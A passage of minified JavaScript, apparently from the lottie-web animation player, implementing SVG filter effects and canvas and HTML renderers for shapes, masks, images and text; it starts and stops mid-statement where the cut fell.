t,e,i=this.animatedContents.length;for(t=0;t<i;t+=1)e=this.animatedContents[t],(this._isFirstFrame||e.element._isAnimated)&&!0!==e.data&&e.fn(e.data,e.element,this._isFirstFrame)},SVGShapeElement.prototype.destroy=function(){this.destroyBaseElement(),this.shapesData=null,this.itemsData=null},SVGTintFilter.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){var e=this.filterManager.effectElements[0].p.v,i=this.filterManager.effectElements[1].p.v,r=this.filterManager.effectElements[2].p.v/100;this.matrixFilter.setAttribute("values",i[0]-e[0]+" 0 0 0 "+e[0]+" "+(i[1]-e[1])+" 0 0 0 "+e[1]+" "+(i[2]-e[2])+" 0 0 0 "+e[2]+" 0 0 0 "+r+" 0")}},SVGFillFilter.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){var e=this.filterManager.effectElements[2].p.v,i=this.filterManager.effectElements[6].p.v;this.matrixFilter.setAttribute("values","0 0 0 0 "+e[0]+" 0 0 0 0 "+e[1]+" 0 0 0 0 "+e[2]+" 0 0 0 "+i+" 0")}},SVGGaussianBlurEffect.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){var e=.3*this.filterManager.effectElements[0].p.v,i=this.filterManager.effectElements[1].p.v,r=3==i?0:e,n=2==i?0:e;this.feGaussianBlur.setAttribute("stdDeviation",r+" "+n);var s=1==this.filterManager.effectElements[2].p.v?"wrap":"duplicate";this.feGaussianBlur.setAttribute("edgeMode",s)}},SVGStrokeEffect.prototype.initialize=function(){var t,e,i,r,n=this.elem.layerElement.children||this.elem.layerElement.childNodes;for(1===this.filterManager.effectElements[1].p.v?(r=this.elem.maskManager.masksProperties.length,i=0):r=1+(i=this.filterManager.effectElements[0].p.v-1),(e=createNS("g")).setAttribute("fill","none"),e.setAttribute("stroke-linecap","round"),e.setAttribute("stroke-dashoffset",1);i<r;i+=1)t=createNS("path"),e.appendChild(t),this.paths.push({p:t,m:i});if(3===this.filterManager.effectElements[10].p.v){var s=createNS("mask"),o=createElementID();s.setAttribute("id",o),s.setAttribute("mask-type","alpha"),s.appendChild(e),this.elem.globalData.defs.appendChild(s);var a=createNS("g");for(a.setAttribute("mask","url("+locationHref+"#"+o+")");n[0];)a.appendChild(n[0]);this.elem.layerElement.appendChild(a),this.masker=s,e.setAttribute("stroke","#fff")}else if(1===this.filterManager.effectElements[10].p.v||2===this.filterManager.effectElements[10].p.v){if(2===this.filterManager.effectElements[10].p.v)for(n=this.elem.layerElement.children||this.elem.layerElement.childNodes;n.length;)this.elem.layerElement.removeChild(n[0]);this.elem.layerElement.appendChild(e),this.elem.layerElement.removeAttribute("mask"),e.setAttribute("stroke","#fff")}this.initialized=!0,this.pathMasker=e},SVGStrokeEffect.prototype.renderFrame=function(t){this.initialized||this.initialize();var e,i,r,n=this.paths.length;for(e=0;e<n;e+=1)if(-1!==this.paths[e].m&&(i=this.elem.maskManager.viewData[this.paths[e].m],r=this.paths[e].p,(t||this.filterManager._mdf||i.prop._mdf)&&r.setAttribute("d",i.lastPath),t||this.filterManager.effectElements[9].p._mdf||this.filterManager.effectElements[4].p._mdf||this.filterManager.effectElements[7].p._mdf||this.filterManager.effectElements[8].p._mdf||i.prop._mdf)){var s;if(0!==this.filterManager.effectElements[7].p.v||100!==this.filterManager.effectElements[8].p.v){var o=Math.min(this.filterManager.effectElements[7].p.v,this.filterManager.effectElements[8].p.v)/100,a=Math.max(this.filterManager.effectElements[7].p.v,this.filterManager.effectElements[8].p.v)/100,l=r.getTotalLength();s="0 0 0 "+l*o+" ";var h,c=l*(a-o),u=1+2*this.filterManager.effectElements[4].p.v*this.filterManager.effectElements[9].p.v/100,d=Math.floor(c/u);for(h=0;h<d;h+=1)s+="1 "+2*this.filterManager.effectElements[4].p.v*this.filterManager.effectElements[9].p.v/100+" ";s+="0 "+10*l+" 0 0"}else s="1 "+2*this.filterManager.effectElements[4].p.v*this.filterManager.effectElements[9].p.v/100;r.setAttribute("stroke-dasharray",s)}if((t||this.filterManager.effectElements[4].p._mdf)&&this.pathMasker.setAttribute("stroke-width",2*this.filterManager.effectElements[4].p.v),(t||this.filterManager.effectElements[6].p._mdf)&&this.pathMasker.setAttribute("opacity",this.filterManager.effectElements[6].p.v),(1===this.filterManager.effectElements[10].p.v||2===this.filterManager.effectElements[10].p.v)&&(t||this.filterManager.effectElements[3].p._mdf)){var p=this.filterManager.effectElements[3].p.v;this.pathMasker.setAttribute("stroke","rgb("+bm_floor(255*p[0])+","+bm_floor(255*p[1])+","+bm_floor(255*p[2])+")")}},SVGTritoneFilter.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){var e=this.filterManager.effectElements[0].p.v,i=this.filterManager.effectElements[1].p.v,r=this.filterManager.effectElements[2].p.v,n=r[0]+" "+i[0]+" "+e[0],s=r[1]+" "+i[1]+" "+e[1],o=r[2]+" "+i[2]+" "+e[2];this.feFuncR.setAttribute("tableValues",n),this.feFuncG.setAttribute("tableValues",s),this.feFuncB.setAttribute("tableValues",o)}},SVGProLevelsFilter.prototype.createFeFunc=function(t,e){var i=createNS(t);return i.setAttribute("type","table"),e.appendChild(i),i},SVGProLevelsFilter.prototype.getTableValue=function(t,e,i,r,n){for(var s,o,a=0,l=Math.min(t,e),h=Math.max(t,e),c=Array.call(null,{length:256}),u=0,d=n-r,p=e-t;a<=256;)o=(s=a/256)<=l?p<0?n:r:s>=h?p<0?r:n:r+d*Math.pow((s-t)/p,1/i),c[u++]=o,a+=256/255;return c.join(" ")},SVGProLevelsFilter.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){var e,i=this.filterManager.effectElements;this.feFuncRComposed&&(t||i[3].p._mdf||i[4].p._mdf||i[5].p._mdf||i[6].p._mdf||i[7].p._mdf)&&(e=this.getTableValue(i[3].p.v,i[4].p.v,i[5].p.v,i[6].p.v,i[7].p.v),this.feFuncRComposed.setAttribute("tableValues",e),this.feFuncGComposed.setAttribute("tableValues",e),this.feFuncBComposed.setAttribute("tableValues",e)),this.feFuncR&&(t||i[10].p._mdf||i[11].p._mdf||i[12].p._mdf||i[13].p._mdf||i[14].p._mdf)&&(e=this.getTableValue(i[10].p.v,i[11].p.v,i[12].p.v,i[13].p.v,i[14].p.v),this.feFuncR.setAttribute("tableValues",e)),this.feFuncG&&(t||i[17].p._mdf||i[18].p._mdf||i[19].p._mdf||i[20].p._mdf||i[21].p._mdf)&&(e=this.getTableValue(i[17].p.v,i[18].p.v,i[19].p.v,i[20].p.v,i[21].p.v),this.feFuncG.setAttribute("tableValues",e)),this.feFuncB&&(t||i[24].p._mdf||i[25].p._mdf||i[26].p._mdf||i[27].p._mdf||i[28].p._mdf)&&(e=this.getTableValue(i[24].p.v,i[25].p.v,i[26].p.v,i[27].p.v,i[28].p.v),this.feFuncB.setAttribute("tableValues",e)),this.feFuncA&&(t||i[31].p._mdf||i[32].p._mdf||i[33].p._mdf||i[34].p._mdf||i[35].p._mdf)&&(e=this.getTableValue(i[31].p.v,i[32].p.v,i[33].p.v,i[34].p.v,i[35].p.v),this.feFuncA.setAttribute("tableValues",e))}},SVGDropShadowEffect.prototype.renderFrame=function(t){if(t||this.filterManager._mdf){if((t||this.filterManager.effectElements[4].p._mdf)&&this.feGaussianBlur.setAttribute("stdDeviation",this.filterManager.effectElements[4].p.v/4),t||this.filterManager.effectElements[0].p._mdf){var e=this.filterManager.effectElements[0].p.v;this.feFlood.setAttribute("flood-color",rgbToHex(Math.round(255*e[0]),Math.round(255*e[1]),Math.round(255*e[2])))}if((t||this.filterManager.effectElements[1].p._mdf)&&this.feFlood.setAttribute("flood-opacity",this.filterManager.effectElements[1].p.v/255),t||this.filterManager.effectElements[2].p._mdf||this.filterManager.effectElements[3].p._mdf){var i=this.filterManager.effectElements[3].p.v,r=(this.filterManager.effectElements[2].p.v-90)*degToRads,n=i*Math.cos(r),s=i*Math.sin(r);this.feOffset.setAttribute("dx",n),this.feOffset.setAttribute("dy",s)}}};var _svgMatteSymbols=[];function SVGMatte3Effect(t,e,i){this.initialized=!1,this.filterManager=e,this.filterElem=t,this.elem=i,i.matteElement=createNS("g"),i.matteElement.appendChild(i.layerElement),i.matteElement.appendChild(i.transformedElement),i.baseElement=i.matteElement}function SVGEffects(t){var e,i,r=t.data.ef?t.data.ef.length:0,n=createElementID(),s=filtersFactory.createFilter(n),o=0;for(this.filters=[],e=0;e<r;e+=1)i=null,20===t.data.ef[e].ty?(o+=1,i=new SVGTintFilter(s,t.effectsManager.effectElements[e])):21===t.data.ef[e].ty?(o+=1,i=new SVGFillFilter(s,t.effectsManager.effectElements[e])):22===t.data.ef[e].ty?i=new SVGStrokeEffect(t,t.effectsManager.effectElements[e]):23===t.data.ef[e].ty?(o+=1,i=new SVGTritoneFilter(s,t.effectsManager.effectElements[e])):24===t.data.ef[e].ty?(o+=1,i=new SVGProLevelsFilter(s,t.effectsManager.effectElements[e])):25===t.data.ef[e].ty?(o+=1,i=new SVGDropShadowEffect(s,t.effectsManager.effectElements[e])):28===t.data.ef[e].ty?i=new SVGMatte3Effect(s,t.effectsManager.effectElements[e],t):29===t.data.ef[e].ty&&(o+=1,i=new SVGGaussianBlurEffect(s,t.effectsManager.effectElements[e])),i&&this.filters.push(i);o&&(t.globalData.defs.appendChild(s),t.layerElement.setAttribute("filter","url("+locationHref+"#"+n+")")),this.filters.length&&t.addRenderableComponent(this)}function CVContextData(){var t;for(this.saved=[],this.cArrPos=0,this.cTr=new Matrix,this.cO=1,this.savedOp=createTypedArray("float32",15),t=0;t<15;t+=1)this.saved[t]=createTypedArray("float32",16);this._length=15}function CVBaseElement(){}function CVImageElement(t,e,i){this.assetData=e.getAssetData(t.refId),this.img=e.imageLoader.getImage(this.assetData),this.initElement(t,e,i)}function CVCompElement(t,e,i){this.completeLayers=!1,this.layers=t.layers,this.pendingElements=[],this.elements=createSizedArray(this.layers.length),this.initElement(t,e,i),this.tm=t.tm?PropertyFactory.getProp(this,t.tm,0,e.frameRate,this):{_placeholder:!0}}function CVMaskElement(t,e){this.data=t,this.element=e,this.masksProperties=this.data.masksProperties||[],this.viewData=createSizedArray(this.masksProperties.length);var i,r=this.masksProperties.length,n=!1;for(i=0;i<r;i++)"n"!==this.masksProperties[i].mode&&(n=!0),this.viewData[i]=ShapePropertyFactory.getShapeProp(this.element,this.masksProperties[i],3);this.hasMasks=n,n&&this.element.addRenderableComponent(this)}function CVShapeElement(t,e,i){this.shapes=[],this.shapesData=t.shapes,this.stylesList=[],this.itemsData=[],this.prevViewData=[],this.shapeModifiers=[],this.processedElements=[],this.transformsManager=new ShapeTransformManager,this.initElement(t,e,i)}function CVSolidElement(t,e,i){this.initElement(t,e,i)}function CVTextElement(t,e,i){this.textSpans=[],this.yOffset=0,this.fillColorAnim=!1,this.strokeColorAnim=!1,this.strokeWidthAnim=!1,this.stroke=!1,this.fill=!1,this.justifyOffset=0,this.currentRender=null,this.renderType="canvas",this.values={fill:"rgba(0,0,0,0)",stroke:"rgba(0,0,0,0)",sWidth:0,fValue:""},this.initElement(t,e,i)}function CVEffects(){}function HBaseElement(t,e,i){}function HSolidElement(t,e,i){this.initElement(t,e,i)}function HCompElement(t,e,i){this.layers=t.layers,this.supports3d=!t.hasMask,this.completeLayers=!1,this.pendingElements=[],this.elements=this.layers?createSizedArray(this.layers.length):[],this.initElement(t,e,i),this.tm=t.tm?PropertyFactory.getProp(this,t.tm,0,e.frameRate,this):{_placeholder:!0}}function HShapeElement(t,e,i){this.shapes=[],this.shapesData=t.shapes,this.stylesList=[],this.shapeModifiers=[],this.itemsData=[],this.processedElements=[],this.animatedContents=[],this.shapesContainer=createNS("g"),this.initElement(t,e,i),this.prevViewData=[],this.currentBBox={x:999999,y:-999999,h:0,w:0}}function HTextElement(t,e,i){this.textSpans=[],this.textPaths=[],this.currentBBox={x:999999,y:-999999,h:0,w:0},this.renderType="svg",this.isMasked=!1,this.initElement(t,e,i)}function HImageElement(t,e,i){this.assetData=e.getAssetData(t.refId),this.initElement(t,e,i)}function HCameraElement(t,e,i){this.initFrame(),this.initBaseData(t,e,i),this.initHierarchy();var r=PropertyFactory.getProp;if(this.pe=r(this,t.pe,0,0,this),t.ks.p.s?(this.px=r(this,t.ks.p.x,1,0,this),this.py=r(this,t.ks.p.y,1,0,this),this.pz=r(this,t.ks.p.z,1,0,this)):this.p=r(this,t.ks.p,1,0,this),t.ks.a&&(this.a=r(this,t.ks.a,1,0,this)),t.ks.or.k.length&&t.ks.or.k[0].to){var n,s=t.ks.or.k.length;for(n=0;n<s;n+=1)t.ks.or.k[n].to=null,t.ks.or.k[n].ti=null}this.or=r(this,t.ks.or,1,degToRads,this),this.or.sh=!0,this.rx=r(this,t.ks.rx,0,degToRads,this),this.ry=r(this,t.ks.ry,0,degToRads,this),this.rz=r(this,t.ks.rz,0,degToRads,this),this.mat=new Matrix,this._prevMat=new Matrix,this._isFirstFrame=!0,this.finalTransform={mProp:this}}function HEffects(){}SVGMatte3Effect.prototype.findSymbol=function(t){for(var e=0,i=_svgMatteSymbols.length;e<i;){if(_svgMatteSymbols[e]===t)return _svgMatteSymbols[e];e+=1}return null},SVGMatte3Effect.prototype.replaceInParent=function(t,e){var i=t.layerElement.parentNode;if(i){for(var r=i.children,n=0,s=r.length;n<s&&r[n]!==t.layerElement;)n+=1;var o;n<=s-2&&(o=r[n+1]);var a=createNS("use");a.setAttribute("href","#"+e),o?i.insertBefore(a,o):i.appendChild(a)}},SVGMatte3Effect.prototype.setElementAsMask=function(t,e){if(!this.findSymbol(e)){var i=createElementID(),r=createNS("mask");r.setAttribute("id",e.layerId),r.setAttribute("mask-type","alpha"),_svgMatteSymbols.push(e);var n=t.globalData.defs;n.appendChild(r);var s=createNS("symbol");s.setAttribute("id",i),this.replaceInParent(e,i),s.appendChild(e.layerElement),n.appendChild(s);var o=createNS("use");o.setAttribute("href","#"+i),r.appendChild(o),e.data.hd=!1,e.show()}t.setMatte(e.layerId)},SVGMatte3Effect.prototype.initialize=function(){for(var t=this.filterManager.effectElements[0].p.v,e=this.elem.comp.elements,i=0,r=e.length;i<r;)e[i]&&e[i].data.ind===t&&this.setElementAsMask(this.elem,e[i]),i+=1;this.initialized=!0},SVGMatte3Effect.prototype.renderFrame=function(){this.initialized||this.initialize()},SVGEffects.prototype.renderFrame=function(t){var e,i=this.filters.length;for(e=0;e<i;e+=1)this.filters[e].renderFrame(t)},CVContextData.prototype.duplicate=function(){var t=2*this._length,e=this.savedOp;this.savedOp=createTypedArray("float32",t),this.savedOp.set(e);var i=0;for(i=this._length;i<t;i+=1)this.saved[i]=createTypedArray("float32",16);this._length=t},CVContextData.prototype.reset=function(){this.cArrPos=0,this.cTr.reset(),this.cO=1},CVBaseElement.prototype={createElements:function(){},initRendererElement:function(){},createContainerElements:function(){this.canvasContext=this.globalData.canvasContext,this.renderableEffectsManager=new CVEffects(this)},createContent:function(){},setBlendMode:function(){var t=this.globalData;if(t.blendMode!==this.data.bm){t.blendMode=this.data.bm;var e=getBlendMode(this.data.bm);t.canvasContext.globalCompositeOperation=e}},createRenderableComponents:function(){this.maskManager=new CVMaskElement(this.data,this)},hideElement:function(){!this.hidden&&(!this.isInRange||this.isTransparent)&&(this.hidden=!0)},showElement:function(){this.isInRange&&!this.isTransparent&&(this.hidden=!1,this._isFirstFrame=!0,this.maskManager._isFirstFrame=!0)},renderFrame:function(){if(!this.hidden&&!this.data.hd){this.renderTransform(),this.renderRenderable(),this.setBlendMode();var t=0===this.data.ty;this.globalData.renderer.save(t),this.globalData.renderer.ctxTransform(this.finalTransform.mat.props),this.globalData.renderer.ctxOpacity(this.finalTransform.mProp.o.v),this.renderInnerContent(),this.globalData.renderer.restore(t),this.maskManager.hasMasks&&this.globalData.renderer.restore(!0),this._isFirstFrame&&(this._isFirstFrame=!1)}},destroy:function(){this.canvasContext=null,this.data=null,this.globalData=null,this.maskManager.destroy()},mHelper:new Matrix},CVBaseElement.prototype.hide=CVBaseElement.prototype.hideElement,CVBaseElement.prototype.show=CVBaseElement.prototype.showElement,extendPrototype([BaseElement,TransformElement,CVBaseElement,HierarchyElement,FrameElement,RenderableElement],CVImageElement),CVImageElement.prototype.initElement=SVGShapeElement.prototype.initElement,CVImageElement.prototype.prepareFrame=IImageElement.prototype.prepareFrame,CVImageElement.prototype.createContent=function(){if(this.img.width&&(this.assetData.w!==this.img.width||this.assetData.h!==this.img.height)){var t=createTag("canvas");t.width=this.assetData.w,t.height=this.assetData.h;var e,i,r=t.getContext("2d"),n=this.img.width,s=this.img.height,o=n/s,a=this.assetData.w/this.assetData.h,l=this.assetData.pr||this.globalData.renderConfig.imagePreserveAspectRatio;o>a&&"xMidYMid slice"===l||o<a&&"xMidYMid slice"!==l?e=(i=s)*a:i=(e=n)/a,r.drawImage(this.img,(n-e)/2,(s-i)/2,e,i,0,0,this.assetData.w,this.assetData.h),this.img=t}},CVImageElement.prototype.renderInnerContent=function(t){this.canvasContext.drawImage(this.img,0,0)},CVImageElement.prototype.destroy=function(){this.img=null},extendPrototype([CanvasRenderer,ICompElement,CVBaseElement],CVCompElement),CVCompElement.prototype.renderInnerContent=function(){var t,e=this.canvasContext;for(e.beginPath(),e.moveTo(0,0),e.lineTo(this.data.w,0),e.lineTo(this.data.w,this.data.h),e.lineTo(0,this.data.h),e.lineTo(0,0),e.clip(),t=this.layers.length-1;t>=0;t-=1)(this.completeLayers||this.elements[t])&&this.elements[t].renderFrame()},CVCompElement.prototype.destroy=function(){var t;for(t=this.layers.length-1;t>=0;t-=1)this.elements[t]&&this.elements[t].destroy();this.layers=null,this.elements=null},CVMaskElement.prototype.renderFrame=function(){if(this.hasMasks){var t,e,i,r,n=this.element.finalTransform.mat,s=this.element.canvasContext,o=this.masksProperties.length;for(s.beginPath(),t=0;t<o;t++)if("n"!==this.masksProperties[t].mode){this.masksProperties[t].inv&&(s.moveTo(0,0),s.lineTo(this.element.globalData.compSize.w,0),s.lineTo(this.element.globalData.compSize.w,this.element.globalData.compSize.h),s.lineTo(0,this.element.globalData.compSize.h),s.lineTo(0,0)),r=this.viewData[t].v,e=n.applyToPointArray(r.v[0][0],r.v[0][1],0),s.moveTo(e[0],e[1]);var a,l=r._length;for(a=1;a<l;a++)i=n.applyToTriplePoints(r.o[a-1],r.i[a],r.v[a]),s.bezierCurveTo(i[0],i[1],i[2],i[3],i[4],i[5]);i=n.applyToTriplePoints(r.o[a-1],r.i[0],r.v[0]),s.bezierCurveTo(i[0],i[1],i[2],i[3],i[4],i[5])}this.element.globalData.renderer.save(!0),s.clip()}},CVMaskElement.prototype.getMaskProperty=MaskElement.prototype.getMaskProperty,CVMaskElement.prototype.destroy=function(){this.element=null},extendPrototype([BaseElement,TransformElement,CVBaseElement,IShapeElement,HierarchyElement,FrameElement,RenderableElement],CVShapeElement),CVShapeElement.prototype.initElement=RenderableDOMElement.prototype.initElement,CVShapeElement.prototype.transformHelper={opacity:1,_opMdf:!1},CVShapeElement.prototype.dashResetter=[],CVShapeElement.prototype.createContent=function(){this.searchShapes(this.shapesData,this.itemsData,this.prevViewData,!0,[])},CVShapeElement.prototype.createStyleElement=function(t,e){var i={data:t,type:t.ty,preTransforms:this.transformsManager.addTransformSequence(e),transforms:[],elements:[],closed:!0===t.hd},r={};if("fl"==t.ty||"st"==t.ty?(r.c=PropertyFactory.getProp(this,t.c,1,255,this),r.c.k||(i.co="rgb("+bm_floor(r.c.v[0])+","+bm_floor(r.c.v[1])+","+bm_floor(r.c.v[2])+")")):("gf"===t.ty||"gs"===t.ty)&&(r.s=PropertyFactory.getProp(this,t.s,1,null,this),r.e=PropertyFactory.getProp(this,t.e,1,null,this),r.h=PropertyFactory.getProp(this,t.h||{k:0},0,.01,this),r.a=PropertyFactory.getProp(this,t.a||{k:0},0,degToRads,this),r.g=new GradientProperty(this,t.g,this)),r.o=PropertyFactory.getProp(this,t.o,0,.01,this),"st"==t.ty||"gs"==t.ty){if(i.lc=this.lcEnum[t.lc]||"round",i.lj=this.ljEnum[t.lj]||"round",1==t.lj&&(i.ml=t.ml),r.w=PropertyFactory.getProp(this,t.w,0,null,this),r.w.k||(i.wi=r.w.v),t.d){var n=new DashProperty(this,t.d,"canvas",this);r.d=n,r.d.k||(i.da=r.d.dashArray,i.do=r.d.dashoffset[0])}}else i.r=2===t.r?"evenodd":"nonzero";return this.stylesList.push(i),r.style=i,r},CVShapeElement.prototype.createGroupElement=function(t){return{it:[],prevViewData:[]}},CVShapeElement.prototype.createTransformElement=function(t){return{transform:{opacity:1,_opMdf:!1,key:this.transformsManager.getNewKey(),op:PropertyFactory.getProp(this,t.o,0,.01,this),mProps:TransformPropertyFactory.getTransformProperty(this,t,this)}}},CVShapeElement.prototype.createShapeElement=function(t){var e=new CVShapeData(this,t,this.stylesList,this.transformsManager);return this.shapes.push(e),this.addShapeToModifiers(e),e},CVShapeElement.prototype.reloadShapes=function(){this._isFirstFrame=!0;var t,e=this.itemsData.length;for(t=0;t<e;t+=1)this.prevViewData[t]=this.itemsData[t];for(this.searchShapes(this.shapesData,this.itemsData,this.prevViewData,!0,[]),e=this.dynamicProperties.length,t=0;t<e;t+=1)this.dynamicProperties[t].getValue();this.renderModifiers(),this.transformsManager.processSequences(this._isFirstFrame)},CVShapeElement.prototype.addTransformToStyleList=function(t){var e,i=this.stylesList.length;for(e=0;e<i;e+=1)this.stylesList[e].closed||this.stylesList[e].transforms.push(t)},CVShapeElement.prototype.removeTransformFromStyleList=function(){var t,e=this.stylesList.length;for(t=0;t<e;t+=1)this.stylesList[t].closed||this.stylesList[t].transforms.pop()},CVShapeElement.prototype.closeStyles=function(t){var e,i=t.length;for(e=0;e<i;e+=1)t[e].closed=!0},CVShapeElement.prototype.searchShapes=function(t,e,i,r,n){var s,o,a,l,h,c,u=t.length-1,d=[],p=[],m=[].concat(n);for(s=u;s>=0;s-=1){if((l=this.searchProcessedElement(t[s]))?e[s]=i[l-1]:t[s]._shouldRender=r,"fl"==t[s].ty||"st"==t[s].ty||"gf"==t[s].ty||"gs"==t[s].ty)l?e[s].style.closed=!1:e[s]=this.createStyleElement(t[s],m),d.push(e[s].style);else if("gr"==t[s].ty){if(l)for(a=e[s].it.length,o=0;o<a;o+=1)e[s].prevViewData[o]=e[s].it[o];else e[s]=this.createGroupElement(t[s]);this.searchShapes(t[s].it,e[s].it,e[s].prevViewData,r,m)}else"tr"==t[s].ty?(l||(c=this.createTransformElement(t[s]),e[s]=c),m.push(e[s]),this.addTransformToStyleList(e[s])):"sh"==t[s].ty||"rc"==t[s].ty||"el"==t[s].ty||"sr"==t[s].ty?l||(e[s]=this.createShapeElement(t[s])):"tm"==t[s].ty||"rd"==t[s].ty?(l?(h=e[s]).closed=!1:((h=ShapeModifiers.getModifier(t[s].ty)).init(this,t[s]),e[s]=h,this.shapeModifiers.push(h)),p.push(h)):"rp"==t[s].ty&&(l?(h=e[s]).closed=!0:(h=ShapeModifiers.getModifier(t[s].ty),e[s]=h,h.init(this,t,s,e),this.shapeModifiers.push(h),r=!1),p.push(h));this.addProcessedElement(t[s],s+1)}for(this.removeTransformFromStyleList(),this.closeStyles(d),u=p.length,s=0;s<u;s+=1)p[s].closed=!0},CVShapeElement.prototype.renderInnerContent=function(){this.transformHelper.opacity=1,this.transformHelper._opMdf=!1,this.renderModifiers(),this.transformsManager.processSequences(this._isFirstFrame),this.renderShape(this.transformHelper,this.shapesData,this.itemsData,!0)},CVShapeElement.prototype.renderShapeTransform=function(t,e){(t._opMdf||e.op._mdf||this._isFirstFrame)&&(e.opacity=t.opacity,e.opacity*=e.op.v,e._opMdf=!0)},CVShapeElement.prototype.drawLayer=function(){var t,e,i,r,n,s,o,a,l,h=this.stylesList.length,c=this.globalData.renderer,u=this.globalData.canvasContext;for(t=0;t<h;t+=1)if(("st"!==(a=(l=this.stylesList[t]).type)&&"gs"!==a||0!==l.wi)&&l.data._shouldRender&&0!==l.coOp&&0!==this.globalData.currentGlobalAlpha){for(c.save(),s=l.elements,"st"===a||"gs"===a?(u.strokeStyle="st"===a?l.co:l.grd,u.lineWidth=l.wi,u.lineCap=l.lc,u.lineJoin=l.lj,u.miterLimit=l.ml||0):u.fillStyle="fl"===a?l.co:l.grd,c.ctxOpacity(l.coOp),"st"!==a&&"gs"!==a&&u.beginPath(),c.ctxTransform(l.preTransforms.finalTransform.props),i=s.length,e=0;e<i;e+=1){for(("st"===a||"gs"===a)&&(u.beginPath(),l.da&&(u.setLineDash(l.da),u.lineDashOffset=l.do)),n=(o=s[e].trNodes).length,r=0;r<n;r+=1)"m"==o[r].t?u.moveTo(o[r].p[0],o[r].p[1]):"c"==o[r].t?u.bezierCurveTo(o[r].pts[0],o[r].pts[1],o[r].pts[2],o[r].pts[3],o[r].pts[4],o[r].pts[5]):u.closePath();("st"===a||"gs"===a)&&(u.stroke(),l.da&&u.setLineDash(this.dashResetter))}"st"!==a&&"gs"!==a&&u.fill(l.r),c.restore()}},CVShapeElement.prototype.renderShape=function(t,e,i,r){var n,s;for(s=t,n=e.length-1;n>=0;n-=1)"tr"==e[n].ty?(s=i[n].transform,this.renderShapeTransform(t,s)):"sh"==e[n].ty||"el"==e[n].ty||"rc"==e[n].ty||"sr"==e[n].ty?this.renderPath(e[n],i[n]):"fl"==e[n].ty?this.renderFill(e[n],i[n],s):"st"==e[n].ty?this.renderStroke(e[n],i[n],s):"gf"==e[n].ty||"gs"==e[n].ty?this.renderGradientFill(e[n],i[n],s):"gr"==e[n].ty?this.renderShape(s,e[n].it,i[n].it):e[n].ty;r&&this.drawLayer()},CVShapeElement.prototype.renderStyledShape=function(t,e){if(this._isFirstFrame||e._mdf||t.transforms._mdf){var i,r,n,s=t.trNodes,o=e.paths,a=o._length;s.length=0;var l=t.transforms.finalTransform;for(n=0;n<a;n+=1){var h=o.shapes[n];if(h&&h.v){for(r=h._length,i=1;i<r;i+=1)1===i&&s.push({t:"m",p:l.applyToPointArray(h.v[0][0],h.v[0][1],0)}),s.push({t:"c",pts:l.applyToTriplePoints(h.o[i-1],h.i[i],h.v[i])});1===r&&s.push({t:"m",p:l.applyToPointArray(h.v[0][0],h.v[0][1],0)}),h.c&&r&&(s.push({t:"c",pts:l.applyToTriplePoints(h.o[i-1],h.i[0],h.v[0])}),s.push({t:"z"}))}}t.trNodes=s}},CVShapeElement.prototype.renderPath=function(t,e){if(!0!==t.hd&&t._shouldRender){var i,r=e.styledShapes.length;for(i=0;i<r;i+=1)this.renderStyledShape(e.styledShapes[i],e.sh)}},CVShapeElement.prototype.renderFill=function(t,e,i){var r=e.style;(e.c._mdf||this._isFirstFrame)&&(r.co="rgb("+bm_floor(e.c.v[0])+","+bm_floor(e.c.v[1])+","+bm_floor(e.c.v[2])+")"),(e.o._mdf||i._opMdf||this._isFirstFrame)&&(r.coOp=e.o.v*i.opacity)},CVShapeElement.prototype.renderGradientFill=function(t,e,i){var r=e.style;if(!r.grd||e.g._mdf||e.s._mdf||e.e._mdf||1!==t.t&&(e.h._mdf||e.a._mdf)){var n=this.globalData.canvasContext,s=e.s.v,o=e.e.v;if(1===t.t)d=n.createLinearGradient(s[0],s[1],o[0],o[1]);else var a=Math.sqrt(Math.pow(s[0]-o[0],2)+Math.pow(s[1]-o[1],2)),l=Math.atan2(o[1]-s[1],o[0]-s[0]),h=a*(e.h.v>=1?.99:e.h.v<=-1?-.99:e.h.v),c=Math.cos(l+e.a.v)*h+s[0],u=Math.sin(l+e.a.v)*h+s[1],d=n.createRadialGradient(c,u,0,s[0],s[1],a);var p,m=t.g.p,f=e.g.c,g=1;for(p=0;p<m;p+=1)e.g._hasOpacity&&e.g._collapsable&&(g=e.g.o[2*p+1]),d.addColorStop(f[4*p]/100,"rgba("+f[4*p+1]+","+f[4*p+2]+","+f[4*p+3]+","+g+")");r.grd=d}r.coOp=e.o.v*i.opacity},CVShapeElement.prototype.renderStroke=function(t,e,i){var r=e.style,n=e.d;n&&(n._mdf||this._isFirstFrame)&&(r.da=n.dashArray,r.do=n.dashoffset[0]),(e.c._mdf||this._isFirstFrame)&&(r.co="rgb("+bm_floor(e.c.v[0])+","+bm_floor(e.c.v[1])+","+bm_floor(e.c.v[2])+")"),(e.o._mdf||i._opMdf||this._isFirstFrame)&&(r.coOp=e.o.v*i.opacity),(e.w._mdf||this._isFirstFrame)&&(r.wi=e.w.v)},CVShapeElement.prototype.destroy=function(){this.shapesData=null,this.globalData=null,this.canvasContext=null,this.stylesList.length=0,this.itemsData.length=0},extendPrototype([BaseElement,TransformElement,CVBaseElement,HierarchyElement,FrameElement,RenderableElement],CVSolidElement),CVSolidElement.prototype.initElement=SVGShapeElement.prototype.initElement,CVSolidElement.prototype.prepareFrame=IImageElement.prototype.prepareFrame,CVSolidElement.prototype.renderInnerContent=function(){var t=this.canvasContext;t.fillStyle=this.data.sc,t.fillRect(0,0,this.data.sw,this.data.sh)},extendPrototype([BaseElement,TransformElement,CVBaseElement,HierarchyElement,FrameElement,RenderableElement,ITextElement],CVTextElement),CVTextElement.prototype.tHelper=createTag("canvas").getContext("2d"),CVTextElement.prototype.buildNewText=function(){var t=this.textProperty.currentData;this.renderedLetters=createSizedArray(t.l?t.l.length:0);var e=!1;t.fc?(e=!0,this.values.fill=this.buildColor(t.fc)):this.values.fill="rgba(0,0,0,0)",this.fill=e;var i=!1;t.sc&&(i=!0,this.values.stroke=this.buildColor(t.sc),this.values.sWidth=t.sw);var r,n,s=this.globalData.fontManager.getFontByName(t.f),o=t.l,a=this.mHelper;this.stroke=i,this.values.fValue=t.finalSize+"px "+this.globalData.fontManager.getFontByName(t.f).fFamily,n=t.finalText.length;var 